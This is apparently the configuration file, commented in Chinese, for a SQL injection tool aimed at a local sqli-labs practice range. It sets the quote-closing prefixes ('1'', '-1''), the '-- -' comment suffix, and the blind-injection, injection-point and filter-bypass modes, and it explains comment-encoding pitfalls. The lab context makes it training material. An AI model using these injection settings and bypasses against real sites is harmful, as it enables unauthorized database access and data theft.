"""全局配置：目标、闭合方式、注释符、绕过规则、行为参数。

main.py 的命令行参数会覆盖这里的默认值。

========== 关于 SUFFIX（注释符）的重要坑点，新手必读 ==========

浏览器手测常用 "--+"，因为浏览器发请求时把 "+" 当作空格，
而 MySQL 的 "-- " 注释符后面必须跟一个空白才生效。

但 requests 库会把 "+" 编码成 %2B（一个真正的加号），
服务器收到的 SQL 就成了 "--+"，注释失效 → 语法错误。

所以这里默认用 "-- -"：中间的空格会被 requests 编码成 "+"，
PHP 解码后又变回空格，注释成立。
============================================================
"""

# ========= 目标（本地 sqli-labs 靶场）=========
TARGET_URL = "http://192.168.1.6/sql/Less-5/"
PARAM_NAME = "id"          # 注入参数名

# ========= 闭合与注释 =========
PREFIX = "1'"              # 正常 id + 单引号闭合（Less-1 是单引号字符串型注入）
UNION_PREFIX = "-1'"       # UNION 注入用不存在的 id，让原查询结果为空，我们的数据才能显示
SUFFIX = "-- -"            # 注释符（见文件头的坑点说明）

# ========= 绕过规则（bypass 管线）=========
# 默认关闭：本地靶场没有 WAF。需要时按顺序叠加，顺序很重要，例如：
#   from bypass.whitespace import SpaceToCommentTransform
#   TRANSFORMS = [SpaceToCommentTransform()]
# 注意：启用 space_to_comment 会把 "-- -" 里的空格也换成 /**/，导致注释失效，
# 此时应在 main.py 调用处把 SUFFIX 换成 "#" 再配合 URL 编码使用。
TRANSFORMS = []

# ========= 行为参数 =========
TIMEOUT = 10               # 单个请求超时（秒）
MAX_COLUMNS = 20           # ORDER BY 探测字段数的上限
DUMP_LIMIT = 10            # 默认导出多少行数据
BLIND_MAX_LEN = 1024       # 盲注模式单次提取的最大长度（也是 GROUP_CONCAT 的默认上限）

# ========= 注入位与盲注 =========
# 注入位：get / post / cookie / header
#   Less-1  ~ 10   get      （参数 id）
#   Less-11 ~ 16   post     （表单 uname）
#   Less-17 ~ 22   cookie / header（Cookie uname、User-Agent 等）
INJECT_MODE = "get"

# 盲注手段：auto（先布尔，不行再时间）/ bool / time
BLIND_TYPE = "auto"
BLIND_SLEEP = 2.0          # 时间盲注每真一次等几秒，网络慢就调大

# 语法变体：auto（按候选顺序自动探测）/ plain / space / and / keyword / comma
# 这是「多种绕过」的开关，auto 会用注入点自己验证哪种写法没被过滤
BYPASS_MODE = "auto"
